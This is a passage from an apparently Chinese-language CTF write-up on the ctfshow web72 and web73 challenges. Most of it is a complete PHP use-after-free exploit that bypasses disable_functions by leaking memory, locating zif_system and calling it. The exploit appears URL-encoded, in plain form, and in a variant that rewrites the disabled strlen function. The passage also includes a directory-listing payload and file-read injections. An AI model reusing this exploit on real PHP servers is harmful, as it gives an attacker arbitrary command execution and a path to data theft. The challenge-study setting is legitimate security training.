20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E</code></pre><p>注意这个payload把方法当函数了，但是本质是一样的。</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();?&gt;</code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>UseAfterFree disable function</p><blockquote><p><a href="https://blog.csdn.net/qq_62414126/article/details/124062044">https://blog.csdn.net/qq_62414126&#x2F;article&#x2F;details&#x2F;124062044</a></p></blockquote><h2 id="为什么在使用eval-函数有时候需要添加"><a href="#为什么在使用eval-函数有时候需要添加" class="headerlink" title="为什么在使用eval()函数有时候需要添加?&gt;"></a>为什么在使用eval()函数有时候需要添加?&gt;</h2><pre class="language-none"><code class="language-none">&lt;?php eval($_GET[1]); #如果我们通过&lt;?&#x3D;&#96;ls&#96;;去执行的话需要在前面添加?&gt; </code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079308-e8ea37f7-98ed-4c6d-bb24-97c1fc8eae1e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079316-0676564d-ce6c-485f-b4a4-0e97d778430d.png" alt="image.png"><br>原因是eval()函数相当于执行php的代码，而<?= 就相当于<?php echo在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的<?php给闭合，不然不会执行。闭合之后就相当于<?php ?> &lt;?&#x3D;<code>ls</code>;</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>先查看一下文件列表：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223723167-df56bcb3-9699-4868-b367-3d8a06f49f82.png" alt="image.png"><br>flag文件在flagc.txt里面。<br>实际上，这道题可以直接使用include来读取：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;include(&#39;&#x2F;flagc.txt&#39;);exit(0);</code></pre><p>但是看了b站的视频发现是想要用上一道题的payload，但是交了之后发现提示说strlen函数被禁用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223844662-48c977ec-a595-46e3-b89b-ecf337552378.png" alt="image.png"><br>然后他的想法是将禁用的strlen函数给重写。<br>那么直接简单重写即可：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;strlen 返回字符串长度function length($a)&#123;    $length &#x3D; 0;    for($i &#x3D; 0; $i &lt; 10000; $i++)&#123;        if ($a[$i])&#123;            $length +&#x3D; 1;        &#125;else&#123;            break;        &#125;    &#125;    return $length;&#125;</code></pre><p>然后修改上一道题的payload：</p><pre class="language-php" data-language="php"><code class="language-php">function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function length($a)&#123;    $length &#x3D; 0;    for($i &#x3D; 0; $i &lt; 10000; $i++)&#123;        if ($a[$i])&#123;            $length +&#x3D; 1;        &#125;else&#123;            break;        &#125;    &#125;    return $length;&#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; length($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(length($abc) &#x3D;&#x3D; 79 || length($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     